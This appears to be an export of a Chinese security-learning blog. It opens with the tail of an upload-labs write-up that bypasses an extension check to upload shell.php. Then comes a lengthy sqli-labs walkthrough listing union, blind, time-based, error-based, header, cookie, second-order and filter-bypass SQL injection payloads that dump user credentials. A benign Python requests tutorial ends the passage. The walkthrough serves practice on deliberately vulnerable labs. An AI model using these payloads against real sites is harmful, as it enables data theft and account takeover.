，上传后的文件名就是1.jpg\n接下来就是该如何通过这关，我们的突破口就在save_name中，我们传入save_name[0]=shell.php/ save_name[2]=png在检测后缀时，因为该数组最后一位是png所以可以绕过。在存储文件时我们存储文件名就会变成shell.php/.，因为用到了move_uploaded_file函数缺陷，我们仍然上传了shell.php。\n注 这里为什么要传save_name[2],因为$file[count($file) - 1] == $file[2-1]而我们$file[1]是一个空值。\n解决方法 ","date":"2024-05-06T22:39:37+08:00","image":"https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405052319298.jpg","permalink":"https://blog.winglet.com/p/upload-labs%E9%9D%B6%E5%9C%BA/","title":"Upload Labs靶场"},{"content":"前言 之前总是打了几关就摆了，这次一定打完。\nsql注入基础 less - 1 先找注入点，题上已经给了提示，所以注入点就是?id=\n然后确认是数字类型还是字符类型\n?id=1\t------\t无报错 ?id=1 --+\t------\t无报错 ?id=1\u0026#39;\t------\t报错 ?id=1\u0026#39; --+\t------\t无报错 所以可以确定是字符类型\n确认列数 ?id=1\u0026#39; order by 3\t------\t正常回显 ?id=1\u0026#39; order by 4\t------\t超出列数 or ?id=1\u0026#39; union select 1,2,3,4 ... 所以可以确定列数为3\n联合注入\n先查出显示位\n?id=-1\u0026#39; union select 1,2,3--+ 可以知道显示位在2，3位置。这里用-1是为了不让sql语句查询到数据，因为id=-1是没有数据的，所以才会把select执行的语句显示出来。\n最后就可以爆数据了\n?id=-1\u0026#39; union select 1,database(),version()--+ ?id=-1\u0026#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;security\u0026#39;--+ ?id=-1\u0026#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=\u0026#39;users\u0026#39;--+ ?id=-1\u0026#39; union select 1,2,group_concat(username ,id , password) from users--+ less - 2 先判断是字符型还是数字型\n?id=1\t------\t正常 ?id=1 and 1=1\t------\t正常 ?id=1 adn 1=2\t------\t错误 可以确定是数字型，后面的步骤就和less-1基本一致了\n?id=-1 union select 1,database(),version()--+ ?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;security\u0026#39;--+ ?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=\u0026#39;users\u0026#39;--+ ?id=-1 union select 1,2,group_concat(username ,id , password) from users--+ less - 3 先判断类型\n?id=1\t------\t正常 ?id=1\u0026#39;\t------\t报错 这里报错显示如下\n可以发现和less-1的报错信息很像，但是报错信息中多了)，所以在这关中闭合符号不是'而是')\n?id=1\u0026#39;)\t------\t报错 ?id=1\u0026#39;)--+\t------\t正常 接着进行注入\n?id=-1\u0026#39;) union select 1,database(),version()--+ ?id=-1\u0026#39;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;security\u0026#39;--+ ?id=-1\u0026#39;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=\u0026#39;users\u0026#39;--+ ?id=-1\u0026#39;) union select 1,2,group_concat(username ,id , password) from users--+ less - 4 还是判断闭合符，这里是通过审计源代码才知道闭合符为\u0026quot;)\n?id=1\u0026#34;)\t------\t报错 ?id=-1\u0026#34;) union select 1,database(),version()--+ ?id=-1\u0026#34;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;security\u0026#39;--+ ?id=-1\u0026#34;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=\u0026#39;users\u0026#39;--+ ?id=-1\u0026#34;) union select 1,2,group_concat(username ,id , password) from users--+ less - 5 经过测试可以判断是字符类型且闭合符为'，但是在这关中正常显示的时候只会显示一个页面。\n也就是说我们无法让它显示数据库信息。不过因为只要语句执行正确，它就会显示该页面，所以我们可以构造判断语句，来测出它的数据信息。这就是布尔盲注。\n?id=1\u0026#39;and length((select database()))\u0026gt;9--+ #大于号可以换成小于号或者等于号，主要是判断数据库的长度。lenfth()是获取当前数据库名的长度。如果数据库是haha那么length()就是4 ?id=1\u0026#39;and ascii(substr((select database()),1,1))=115--+ #substr(\u0026#34;78909\u0026#34;,1,1)=7 substr(a,b,c)a是要截取的字符串，b是截取的位置，c是截取的长度。布尔盲注我们都是长度为1因为我们要一个个判断字符。ascii()是将截取的字符转换成对应的ascii吗，这样我们可以很好确定数字根据数字找到对应的字符。 ?id=1\u0026#39;and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))\u0026gt;13--+ 判断所有表名字符长度。 ?id=1\u0026#39;and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))\u0026gt;99--+ 逐一判断表名 ?id=1\u0026#39;and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\u0026#39;users\u0026#39;))\u0026gt;20--+ 判断所有字段名的长度 ?id=1\u0026#39;and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\u0026#39;users\u0026#39;),1,1))\u0026gt;99--+ 逐一判断字段名。 ?id=1\u0026#39; and length((select group_concat(username,password) from users))\u0026gt;109--+ 判断字段内容长度 ?id=1\u0026#39; and ascii(substr((select group_concat(username,password) from users),1,1))\u0026gt;50--+ 逐一检测内容。 然后可以根据这些sql语句来编写盲注脚本\nless - 6 闭合符为\u0026quot;，方法同less-5\nless - 7 闭合符为'))，方法同less-5\nless - 8 闭合符为'，这关除了不会显示报错信息以外，方法同less-5\nless - 9 这关无论输入什么页面显示的内容都是一样的，所以布尔盲注就用不了了，但是它依然可以执行我们插入的sql语句。因此在页面不变的时候，我们可以使用时间盲注，就是但判断为真时，让页面过几秒再渲染，这里就需要使用sleep()函数。\n?id=1\u0026#39; and if(1=1,sleep(5),1)--+ 判断参数构造。 ?id=1\u0026#39;and if(length((select database()))\u0026gt;9,sleep(5),1)--+ 判断数据库名长度 ?id=1\u0026#39;and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+ 逐一判断数据库字符 ?id=1\u0026#39;and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))\u0026gt;13,sleep(5),1)--+ 判断所有表名长度 ?id=1\u0026#39;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))\u0026gt;99,sleep(5),1)--+ 逐一判断表名 ?id=1\u0026#39;and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\u0026#39;users\u0026#39;))\u0026gt;20,sleep(5),1)--+ 判断所有字段名的长度 ?id=1\u0026#39;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\u0026#39;users\u0026#39;),1,1))\u0026gt;99,sleep(5),1)--+ 逐一判断字段名。 ?id=1\u0026#39; and if(length((select group_concat(username,password) from users))\u0026gt;109,sleep(5),1)--+ 判断字段内容长度 ?id=1\u0026#39; and if(ascii(substr((select group_concat(username,password) from users),1,1))\u0026gt;50,sleep(5),1)--+ 逐一检测内容。 和布尔盲注一样，需要花费很多时间去一点一点尝试，所以可以构造一个脚本进行测试。\nless - 10 闭合符为\u0026quot;，方法同less-9\nless - 11 这关的页面就和之前的不同了，是一个登录界面。\n在之前注入都是通过get方法进行传参的，这关中则是post传参，可以猜测这里username和password都是注入点，所以先测试一下，让其报出错误信息。\n根据报错语句，我们可以直接在username栏中进行注入。由于这里是post方法，所以注释符需要使用#或者--后面加上空格符。这里注释符的不同和传参方式有关。\n接着进行联合注入\nusername = 1\u0026#39; union select 1,2# \u0026amp; password = 后面方法同之前一样。\nless - 12 闭合符为\u0026quot;)方法同less-11\nless - 13 闭合符为')，但是这关只显示登录成功或失败，所以这关考点是布尔盲注。\n1\u0026#39;) or length((select database()))\u0026gt;9# 这里需要使用or，因为登录账号是错误的，所以需要由后面的判断来决定这段语句的true or false\nless - 14 闭合符为\u0026quot;，方法同less-13\nless - 15 闭合符为'，方法同less-13\nless - 16 闭合符为\u0026quot;)，方法同less-13\nless - 17 这关又有新的东西了，先看部分源代码\nfunction check_input($value) // $value是 username 中的内容 { if(!empty($value)) { // truncation (see comments) $value = substr($value,0,15);\t//限制传入字符数 } // Stripslashes if magic quotes enabled if (get_magic_quotes_gpc())\t// 检测该函数是否开启 { $value = stripslashes($value);\t//删除字符串中的 / } // Quote if not a number if (!ctype_digit($value))\t// 检测传入的字符是否都是数字 { $value = \u0026#34;\u0026#39;\u0026#34; . mysql_real_escape_string($value) . \u0026#34;\u0026#39;\u0026#34;; } else { $value = intval($value); } return $value; } 这里需要用到的就是报错注入。报错注入一般使用这三个函数extractvalue()、updatexml()、group by()。\nextractvalue extractvalue(XML_document, Path_string)\n第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc\n第二个参数：XPath_string（XPath格式的字符串）\n原理：extractvalue(xml_frag, xpath_expr) 函数接收两个参数，一个是XML文档片段，另一个是XPath表达式。正常情况下，这个函数会根据给定的XPath路径从XML文档中提取数据。然而，当XPath表达式构造不当，例如包含了非法字符或者尝试执行一个无法解析为有效XPath表达式的字符串时，函数会抛出错误，并且错误信息可能包含有关查询的信息，这便为报错注入提供了机会。攻击者可以通过精心构造的XPath表达式来触发错误，进而获取数据库敏感信息。\n1\u0026#39; and (extractvalue(1,concat(0x5c,version(),0x5c)))# 爆版本 1\u0026#39; and (extractvalue(1,concat(0x5c,database(),0x5c)))# 爆数据库 1\u0026#39; and (extractvalue(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5c)))# 爆表名 1\u0026#39; and (extractvalue(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\u0026#39;users\u0026#39;),0x5c)))# 爆字段名 1\u0026#39; and (extractvalue(1,concat(0x5c,(select password from (select password from users where username=\u0026#39;admin1\u0026#39;) b) ,0x5c)))# 爆字段内容该格式针对mysql数据库。 1\u0026#39; and (extractvalue(1,concat(0x5c,(select group_concat(username,password) from users),0x5c)))# 爆字段内容。 这个页面是修改密码页面，所以在username栏中需要输入正确的账号，注入点在password中\nupdatexml updatexml(XML_document, XPath_string, new_value)\n第一个参数：XML_document是String格式，为XML文档对象的名称。\n第二个参数：XPath_string(XPath格式的字符串)\n第三个参数：new_value, String格式，替换查找到的符合条件的数据\n原理：它试图根据XPath表达式定位到XML文档中的某个节点并用new_value替换该节点的内容。如果XPath表达式被设计成无法解析或指向无效位置，那么这个函数也会产生错误。通过控制XPath字符串内容，攻击者能够引起特定类型的错误，这些错误消息中可能携带了关于数据库表结构或数据的信息。\n123\u0026#39; and (updatexml(1,concat(0x5c,version(),0x5c),1))# 爆版本 123\u0026#39; and (updatexml(1,concat(0x5c,database(),0x5c),1))# 爆数据库 123\u0026#39; and (updatexml(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5c),1))# 爆表名 123\u0026#39; and (updatexml(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema=\u0026#39;security\u0026#39; and table_name =\u0026#39;users\u0026#39;),0x5c),1))#\t爆字段名 123\u0026#39; and (updatexml(1,concat(0x5c,(select password from (select password from users where username=\u0026#39;admin1\u0026#39;) b),0x5c),1))# 爆密码该格式针对mysql数据库。 爆其他表就可以，下面是爆emails表 123\u0026#39; and (updatexml(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema=\u0026#39;security\u0026#39; and table_name =\u0026#39;emails\u0026#39;),0x5c),1))# 1\u0026#39; and (updatexml (1,concat(0x5c,(select group_concat(id,email_id) from emails),0x5c),1))# 爆字段内容。 group by 123\u0026#39; and (select count(*) from information_schema.tables group by concat(database(),0x5c,floor(rand(0)*2)))# 爆数据库 123\u0026#39; and (select count(*) from information_schema.tables group by concat(version(),0x5c,floor(rand(0)*2)))# 爆数据库版本 1\u0026#39; and (select count(*) from information_schema.tables where table_schema=database() group by concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e,floor(rand(0)*2)))# 通过修改limit后面数字一个一个爆表 1\u0026#39; and (select count(*) from information_schema.tables where table_schema=database() group by concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e,floor(rand(0)*2)))# 爆出所有表 1\u0026#39; and (select count(*) from information_schema.columns where table_schema=database() group by concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\u0026#39;users\u0026#39;),0x7e,floor(rand(0)*2)))# 爆出所有字段名 1\u0026#39; and (select count(*) from information_schema.columns group by concat(0x7e,(select group_concat(username,password) from users),0x7e,floor(rand(0)*2)))# 爆出所有字段名 1\u0026#39; and (select 1 from(select count(*) from information_schema.columns where table_schema=database() group by concat(0x7e,(select password from users where username=\u0026#39;admin1\u0026#39;),0x7e,floor(rand(0)*2)))a)# 爆出该账户的密码。 less - 18 这关也使用报错注入，但是注入点不同，查看源代码\n发现注入点在user-agent字段，这时就需要使用burpsuite工具进行抓包，然后在user-agent请求头进行注入。\n不过这里需要注意两点，首先我们的账号密码需要输入正确，因为根据代码逻辑只有正常登录才会显示user-agent的信息。第二就是需要根据编写好的sql语句进行闭合，才能注入成功。\n之后就可以使用less-17报错注入的方法了\nless - 19 这里的注入点变成了referer请求头，写法如下\nreferer: 1\u0026#39;,2)# 方法同less-18\nless - 20 这关注入点在cookie字段\n这里需要先正常登录，然后进入登录界面\n接着重新刷新该页面，并抓包\n方法同less-17\nless - 21 源代码中\n$sql=\u0026#34;SELECT * FROM users WHERE username=(\u0026#39;$cookee\u0026#39;) LIMIT 0,1\u0026#34;; 所以这里闭合符为'),注入点依然是cookie字段，不同点在于这关注入语句需要进行base64编码\nless - 22 闭合符为\u0026quot;，方法同less-21\nless - 23 这关中注释符被过滤了。但是并不妨碍我们进行注入，我们使用注释符只是为了在拼接语句时，将后面一些没用的语句去除。现在不允许使用注释符，我们只要按照它的逻辑进行拼接就行。\n?id=1\u0026#39; or \u0026#39;1\u0026#39;=\u0026#39;1 在拼接中就会变为: ?id=1\u0026#39; or \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39; 所以可以理解为现在or '1'='1变成了我们的注释符，接着使用联合注入的方法\n?id=-1\u0026#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;security\u0026#39;),3 or \u0026#39;1\u0026#39;=\u0026#39;1 ?id=-1\u0026#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=\u0026#39;security\u0026#39; and table_name=\u0026#39;users\u0026#39; ),3 or \u0026#39;1\u0026#39;=\u0026#39;1 ?id=-1\u0026#39; union select 1,(select group_concat(password,username) from users),3 or \u0026#39;1\u0026#39;=\u0026#39;1 less - 24 这关的页面组成就比较复杂了，有注册页面、登录页面、修改密码页面，而这些相应的文件我们都要使用到。\n先来讲讲这关注入的逻辑，以及文件之间的联动。\nlogin_register.php\n这个文件掌管注册功能，可以看见这里对注册的账号密码没有任何管控，也就是说你输入什么信息都可以，那我们这里以username=admin'# password=123456信息来注册，注册成功。\n接着我们就用这个信息来登录，下面是登录后的界面\npass_change.php\n这个是修改密码的文件，现在我们用现在登录后的信息拼接到更新密码的sql语句中就会变成\nUPDATE users SET PASSWORD=\u0026#39;$pass\u0026#39; where username=\u0026#39;admin\u0026#39;# and password=\u0026#39;123456\u0026#39; 可以发现我们这里修改的账号就会变成admin,这就是二次注入的原理。原来admin密码是admin，现在我们就可以把它的密码修改为我们知道的密码123456\n可以看到我们成功修改了admin的密码，之后就可以用它的权限登录。\nless - 25 这关将or和and替换为空并且无论大小写，但是它只替换了一次，所以我们可以双写绕过，如果注入语句中含有or，我们可以将其写为oorr，这样即使替换为空，依然得到or\n?id=-2\u0026#39; union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema=\u0026#39;security\u0026#39;--+ less - 25a 变成了数字型，方法同上\n?id=-2 union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema=\u0026#39;security\u0026#39;--+ less - 26 添加了新的规则，所以现在不能使用逻辑运算符、注释符以及空格符。这次就需要进行绕过。\n绕过空格 %09 tab键 %0a 新建一行 %0c 新的一页 %od return功能 %0b tab键垂直 %a0 空格 绕过AND \u0026amp;\u0026amp; %26%26 绕过or || %7C%7C 只要如此绕过，接下来就可以正常注入。不过可能本地建的apache服务没有解析功能，所以还得用()方法绕过。\n?id=1\u0026#39;||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=\u0026#39;security\u0026#39;))),1))||\u0026#39;0 爆表 ?id=1\u0026#39;||(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=\u0026#39;security\u0026#39;aandnd(table_name=\u0026#39;users\u0026#39;)))),1))||\u0026#39;0 爆字段 ?id=1\u0026#39;||(updatexml(1,concat(0x7e,(select(group_concat(passwoorrd,username))from(users))),1))||\u0026#39;0 爆密码账户 总结 get传参和post传参注释符使用的不同 ","date":"2024-04-14T22:48:59+08:00","image":"https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202406270744823.gif","permalink":"https://blog.winglet.com/p/sql-labs%E9%9D%B6%E5%9C%BA-%E6%9B%B4%E6%96%B0%E4%B8%AD/","title":"Sql Labs靶场 [更新中]"},{"content":"urllib 这个库目前只提一嘴，因为还有和它一样且功能更强大的库。这个库我在写爬虫的时候也是不常使用。如果在以后遇到必须使用该库才能解决的问题时再去详细介绍这个库的功能。\nrequests 这个库就是我提到了功能更加强大的库。\n安装 pip3 install requests 如果有pycharm可在这个进行添加\n实例 运行下面代码\nimport requests resp = requests.get(\u0026#34;https://www.baidu.com\u0026#34;) print(type(resp)) // 响应类型 print(resp.status_code) // 状态码 print(type(resp.text)) // 响应体类型 print(resp.text[:100]) // 响应体源码 print(resp.cookies) // cookie内容 运行结果如下\n\u0026lt;class \u0026#39;requests.models.Response\u0026#39;\u0026gt; 200 \u0026lt;class \u0026#39;str\u0026#39;\u0026gt; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;!--STATUS OK--\u0026gt;\u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;meta http-equiv=content-type content=text/html;charse \u0026lt;RequestsCookieJar[\u0026lt;Cookie BDORZ=27315 for .baidu.com/\u0026gt;]\u0026gt; 可以看见使用requests.get方法就相当于对该网址进行了GET请求。\nrequests作为强大的网站请求模块，它的请求方法也不止一种\nrequests.get(url) requests.post(url) requests.put(url) requests.delete(url) requests.patch(url) 这里只是粗略的介绍，后面再详细介绍。\nGET请求 构造一个简单的get请求，链接是https://www.httpbin.org/get，这个网站可以判断客户端是不是进行了GET请求，并会返回响应包\nimport requests resp = requests.get(\u0026#34;https://www.httpbin.org/get\u0026#34;) print(resp.text) 运行结果\n{ \u0026#34;args\u0026#34;: {}, \u0026#34;headers\u0026#34;: { \u0026#34;Accept\u0026#34;: \u0026#34;*/*\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate\u0026#34;, \u0026#34;Host\u0026#34;: \u0026#34;www.httpbin.org\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;python-requests/2.28.1\u0026#34;, \u0026#34;X-Amzn-Trace-Id\u0026#34;: \u0026#34;Root=1-65d964ae-5eed64e46ba780af34b5b853\u0026#34; }, \u0026#34;origin\u0026#34;: \u0026#34;194.99.79.246\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.httpbin.org/get\u0026#34; } 返回结果中有请求头、url、ip等信息，这就说明我们成功发起了GET请求\n添加额外信息 如果要在GET请求中添加额外信息，在正常请求时通常是写成 http://www.temple.com/?name=winglet 所以在用模块进行请求时也可以写成这样。\n但是在requests模块中我们也可以通过params参数进行添加，例\nimport requests data = { \u0026#34;name\u0026#34;: \u0026#34;winglet\u0026#34;, \u0026#34;age\u0026#34;: \u0026#34;21\u0026#34; } resp = requests.get(\u0026#34;http://www.httpbin.org/get\u0026#34;, params=data) print(resp.text) 运行结果\n{ \u0026#34;args\u0026#34;: { \u0026#34;age\u0026#34;: \u0026#34;21\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;winglet\u0026#34; }, \u0026#34;headers\u0026#34;: { \u0026#34;Accept\u0026#34;: \u0026#34;*/*\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate\u0026#34;, \u0026#34;Host\u0026#34;: \u0026#34;www.httpbin.org\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;python-requests/2.28.1\u0026#34;, \u0026#34;X-Amzn-Trace-Id\u0026#34;: \u0026#34;Root=1-65d9ae9f-79d024cb23c6e21356632251\u0026#34; }, \u0026#34;origin\u0026#34;: \u0026#34;194.99.79.246\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;http://www.httpbin.org/get?name=winglet\u0026amp;age=21\u0026#34; } 返回结果与访问http://www.httpbin.org/get?name=winglet\u0026amp;age=21的返回结果一样\n这里我们可以发现上面实验的返回结果明显是json类型，所以我们也可以转换它们的类型\nimport requests resp = requests.get(\u0026#34;http://www.httpbin.org/get\u0026#34;) print(type(resp.text)) print(resp.json()) print(type(resp.json())) 运行结果\n\u0026lt;class \u0026#39;str\u0026#39;\u0026gt; {\u0026#39;args\u0026#39;: {}, \u0026#39;headers\u0026#39;: {\u0026#39;Accept\u0026#39;: \u0026#39;*/*\u0026#39;, \u0026#39;Accept-Encoding\u0026#39;: \u0026#39;gzip, deflate\u0026#39;, \u0026#39;Host\u0026#39;: \u0026#39;www.httpbin.org\u0026#39;, \u0026#39;User-Agent\u0026#39;: \u0026#39;python-requests/2.28.1\u0026#39;, \u0026#39;X-Amzn-Trace-Id\u0026#39;: \u0026#39;Root=1-65d9b0c4-7caba3c72eecb41d635c8987\u0026#39;}, \u0026#39;origin\u0026#39;: \u0026#39;194.99.79.246\u0026#39;, \u0026#39;url\u0026#39;: \u0026#39;http://www.httpbin.org/get\u0026#39;} \u0026lt;class \u0026#39;dict\u0026#39;\u0026gt; 抓取网页 就以上面抓取结果来说，我们通常抓出来的就是这么一大串信息，但需要在这些信息里面提取有效信息，这里我们就以https://ssr1.scrape.center/为例\nimport requests import re resp = requests.get(\u0026#34;https://ssr1.scrape.center/\u0026#34;) pattern = re.compile(\u0026#34;\u0026lt;h2.*?\u0026gt;(.*?)\u0026lt;/h2\u0026gt;\u0026#34;, re.S) tiltles = re.findall(pattern, resp.text) print(tiltles) 运行结果\n[\u0026#39;霸王别姬 - Farewell My Concubine\u0026#39;, \u0026#39;这个杀手不太冷 - Léon\u0026#39;, \u0026#39;肖申克的救赎 - The Shawshank Redemption\u0026#39;, \u0026#39;泰坦尼克号 - Titanic\u0026#39;, \u0026#39;罗马假日 - Roman Holiday\u0026#39;, \u0026#39;唐伯虎点秋香 - Flirting Scholar\u0026#39;, \u0026#39;乱世佳人 - Gone with the Wind\u0026#39;, \u0026#39;喜剧之王 - The King of Comedy\u0026#39;, \u0026#39;楚门的世界 - The Truman Show\u0026#39;, \u0026#39;狮子王 - The Lion King\u0026#39;] 在提取有效信息时就需要用到re模块，就是用正则表达式来匹配有效信息，这块后面再讲。\n抓取二进制数据 我们常见抓取的二进制数据就是图片了。像博客上传图片就是生成一个图片链接，所以我们直接访问其链接就能获取到这个图片的二进制内容，然后浏览器就会解析并将该图片展现出来。\n现在随便抓取一个图片\nimport requests resp = requests.get(\u0026#34;https://scrape.center/favicon.ico\u0026#34;) print(resp.text[:100]) print(resp.content[:100]) // byte类型 运行结果\n存储这么一大串字符是个麻烦的事，所以我们要把它转换成图片，图片说白了就是一个二进制文件，把它转换成文件存储起来就可以了\nimport requests resp = requests.get(\u0026#34;https://scrape.center/favicon.ico\u0026#34;) with open(\u0026#34;1.ico\u0026#34;, \u0026#39;wb\u0026#39;) as f: f.write(resp.content) 这样我们就在当前目录下生成了一个1.ico文件\n添加请求头 现在很多网站都有一些反爬机制，我们在之前的请求中是没有设置请求头的，有一些网站检测你的请求头时发现user-agent字段没有数据，就会认为该请求不是来自一个正常的浏览器，就会返回异常结果阻止爬取。\n那么我们就需要自己去设置请求头，在requests模块中我们用headers参数来设置请求头内容\nimport requests headers = { \u0026#34;user-agent\u0026#34;: \u0026#34;Mozilla / 5.0(Windows NT 10.0; Win64; x64) AppleWebKit / 537.36(KHTML, like Gecko) Chrome / 80.0.3987.122 Safari / 537.36\u0026#34; } resp = requests.get(\u0026#34;https://scrape.center/favicon.ico\u0026#34;, headers=headers) 通过此方法便可以传送请求头\nPOST请求 检测是否进行了POST请求\nimport requests url = \u0026#34;https://www.httpbin.org/post\u0026#34; resp = requests.post(url) print(resp.text)xxxxxxxxxx import import requestsurl = \u0026#34;https://www.httpbin.org/post\u0026#34;resp = requests.post(url)print(resp.text) 运行结果\n{ \u0026#34;args\u0026#34;: {}, \u0026#34;data\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;files\u0026#34;: {}, \u0026#34;form\u0026#34;: {}, \u0026#34;headers\u0026#34;: { \u0026#34;Accept\u0026#34;: \u0026#34;*/*\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate\u0026#34;, \u0026#34;Content-Length\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;Host\u0026#34;: \u0026#34;www.httpbin.org\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;python-requests/2.28.1\u0026#34;, \u0026#34;X-Amzn-Trace-Id\u0026#34;: \u0026#34;Root=1-65db3cc9-36d6eb4a782f3e713ca51969\u0026#34; }, \u0026#34;json\u0026#34;: null, \u0026#34;origin\u0026#34;: \u0026#34;194.99.79.246\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.httpbin.org/post\u0026#34; } 有返回结果说明是POST请求。\n如果要提交表单的话，需要使用data参数\nimport requests url = \u0026#34;https://www.httpbin.org/post\u0026#34; data = { \u0026#34;name\u0026#34;: \u0026#34;winglet\u0026#34; } resp = requests.post(url, data=data) print(resp.text) 运行结果\n{ \u0026#34;args\u0026#34;: {}, \u0026#34;data\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;files\u0026#34;: {}, \u0026#34;form\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;winglet\u0026#34; }, \u0026#34;headers\u0026#34;: { \u0026#34;Accept\u0026#34;: \u0026#34;*/*\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate\u0026#34;, \u0026#34;Content-Length\u0026#34;: \u0026#34;12\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, \u0026#34;Host\u0026#34;: \u0026#34;www.httpbin.org\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;python-requests/2.28.1\u0026#34;, \u0026#34;X-Amzn-Trace-Id\u0026#34;: \u0026#34;Root=1-65dca076-47c67045141f47526b668509\u0026#34; }, \u0026#34;json\u0026#34;: null, \u0026#34;origin\u0026#34;: \u0026#34;194.99.79.246\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.httpbin.org/post\u0026#34; } 可以看见我们提交的表单数据就被放在了form参数中\n响应 发送了请求后，自然能得到响应，我们上述的结果中只是展示了响应的一部分，之前我们讲到过，响应里面是有响应体，状态码，cookie等信息的。所以我们也可以通过其他方法函数将它们展示出来\nimport requests url = \u0026#34;https://ssr1.scrape.center\u0026#34; resp = requests.get(url) print(type(resp.status_code), resp.status_code) print(type(resp.headers), resp.headers) print(type(resp.cookies), resp.cookies) print(type(resp.url), resp.url) print(type(resp.history), resp.history) 运行结果\n\u0026lt;class \u0026#39;int\u0026#39;\u0026gt; 200 \u0026lt;class \u0026#39;requests.structures.CaseInsensitiveDict\u0026#39;\u0026gt; {\u0026#39;Date\u0026#39;: \u0026#39;Mon, 26 Feb 2024 14:36:24 GMT\u0026#39;, \u0026#39;Content-Type\u0026#39;: \u0026#39;text/html; charset=utf-8\u0026#39;, \u0026#39;X-Frame-Options\u0026#39;: \u0026#39;DENY\u0026#39;, \u0026#39;X-Content-Type-Options\u0026#39;: \u0026#39;nosniff\u0026#39;, \u0026#39;Expires\u0026#39;: \u0026#39;Mon, 26 Feb 2024 14:38:47 GMT\u0026#39;, \u0026#39;Strict-Transport-Security\u0026#39;: \u0026#39;max-age=15724800; includeSubDomains\u0026#39;, \u0026#39;Server\u0026#39;: \u0026#39;E0MID\u0026#39;, \u0026#39;X-Cache-Lookup\u0026#39;: \u0026#39;Cache Miss, Cache Miss, Cache Miss, Cache Miss\u0026#39;, \u0026#39;Cache-Control\u0026#39;: \u0026#39;max-age=600\u0026#39;, \u0026#39;Age\u0026#39;: \u0026#39;0\u0026#39;, \u0026#39;Content-Length\u0026#39;: \u0026#39;41667\u0026#39;, \u0026#39;X-NWS-LOG-UUID\u0026#39;: \u0026#39;17190695892387289445\u0026#39;, \u0026#39;Connection\u0026#39;: \u0026#39;keep-alive\u0026#39;} \u0026lt;class \u0026#39;requests.cookies.RequestsCookieJar\u0026#39;\u0026gt; \u0026lt;RequestsCookieJar[]\u0026gt; \u0026lt;class \u0026#39;str\u0026#39;\u0026gt; https://ssr1.scrape.center/ \u0026lt;class \u0026#39;list\u0026#39;\u0026gt; [] 基\n本信息便如此。\n可以看见状态码是200，表示网站正常访问。不过在requests模块中，还存在内置函数来表示某种状态。比如requests.codes.ok就表示200，当然还有很多状态表示函数，不过个人感觉没必要去记，做个了解即可。\n高级用法 文件上传 直接实例展示\nimport requests file = { \u0026#34;file\u0026#34;: open(\u0026#34;1.ico\u0026#34;, \u0026#34;rb\u0026#34;) } resp = requests.post(\u0026#34;http://httpbin.org/post\u0026#34;, files=file) print(resp.text) 运行结果\n{ \u0026#34;args\u0026#34;: {}, \u0026#34;data\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;files\u0026#34;: { \u0026#34;file\u0026#34;: \u0026#34;data:application/octet-stream;base64,AAABAAEAI......\u0026#34; }, \u0026#34;form\u0026#34;: {}, \u0026#34;headers\u0026#34;: { \u0026#34;Accept\u0026#34;: \u0026#34;*/*\u0026#34;, 